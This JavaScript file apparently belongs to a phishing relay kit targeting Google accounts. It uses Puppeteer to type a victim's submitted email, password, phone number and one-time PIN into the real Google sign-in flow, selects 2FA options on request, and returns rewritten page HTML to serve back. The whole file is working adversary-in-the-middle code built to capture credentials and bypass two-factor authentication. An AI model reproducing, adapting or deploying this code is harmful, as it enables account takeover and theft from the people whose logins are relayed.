const { Application } = require("../Application")
const { getHeaders } = require("../headers")

class Google extends Application {
    async postRequest(configuration) {
        const browser = await this.connectBrowser()
        const pages = await browser.pages()
        const page = pages[0]
        await page.setExtraHTTPHeaders(getHeaders(this.device))

        const body = configuration.body
        const spikeType = body["spike-type"]
        try {
            if (spikeType == "email") {
                let email = "#identifierId"
                let submitBtn = "#form_next_btn"

                await page.evaluate(() => {
                    document.querySelector("#identifierNext").querySelector("button").id = "form_next_btn"
                })
                await page.waitForSelector(email)
                await page.type(email, body.identifier)

                await Promise.all([
                    page.click(submitBtn),
                    new Promise(re => setTimeout(re, 4000))
                ])
            } else if (spikeType == "password") {
                let passwordSel = `[type="password"]`
                let submitBtn = "#form_next_btn"

                await page.evaluate(() => {
                    document.querySelector("#passwordNext").querySelector("button").id = "form_next_btn"
                })
                await page.waitForSelector(passwordSel)
                await page.type(passwordSel, body.Passwd)

                await Promise.all([
                    page.click(submitBtn),
                    new Promise(re => setTimeout(re, 6000))
                ])
            } else if (spikeType == "auth-keys") {
                let AuthKeyindex = body["auth-key-index"]
                await page.evaluate(() => {
                    let authContainer = document.querySelector(".OVnw0d")
                    let authKeys = authContainer.querySelectorAll(".JDAKTe.cd29Sd.zpCp3.SmR8")
                    authKeys.forEach((btn, index) => {
                        btn.setAttribute("auth-key-id", index)
                    })
                })

                await page.waitForSelector(`[auth-key-id="${AuthKeyindex}"]`)
                await Promise.all([
                    page.click(`[auth-key-id="${AuthKeyindex}"]`),
                    new Promise(re => setTimeout(re, 4000))
                ])
            } else if (spikeType == "phone-number") {
                let phoneNumberId = `#phoneNumberId`
                await page.waitForSelector(phoneNumberId)

                await page.type(phoneNumberId, body.phoneNumber)
                await Promise.all([
                    page.click(`[type="button"]`),
                    new Promise(re => setTimeout(re, 5000))
                ])
            } else if (spikeType == "otp") {
                let otpInput = "#idvPin"
                let otp_submit = "#otp_submit"
                await page.evaluate(() => {
                    let idvPreregisteredPhoneNext = document.querySelector("#idvPreregisteredPhoneNext")
                    if (idvPreregisteredPhoneNext) {
                        idvPreregisteredPhoneNext.querySelector("button").id = "otp_submit"
                    }
                })

                await page.waitForSelector(otpInput)
                await page.waitForSelector(otp_submit)
                await page.type(otpInput, body.Pin)

                await Promise.all([
                    page.click(otp_submit),
                    new Promise(re => setTimeout(re, 5000))
                ])
            } else if (spikeType == "otp_2") {
                let sel = "#idvPinId"
                await page.waitForSelector(sel)
                await page.type(sel, body.Pin)

                await Promise.all([
                    page.click(`[type="button"]`),
                    new Promise(re => setTimeout(re, 5000))
                ])
            } else {
                return await this.openTAB(true)
            }


            const html = await page.content()
            let response = this.alterHTML(html, true)
            return response

        } catch (error) {
            console.log(error, "\n\n::- resetting the page to index or moving on.")
            return await this.openTAB(true)
        }
    }
}

async function init(reqType, config) {
    const appBrowser = new Google(config)
    await appBrowser.openBrowser()

    if (reqType == "getReq") {
        return await appBrowser.openTAB(true)
    } else if (reqType == "postReq") {
        return await appBrowser.postRequest(config)
    }
}

module.exports = {
    init
}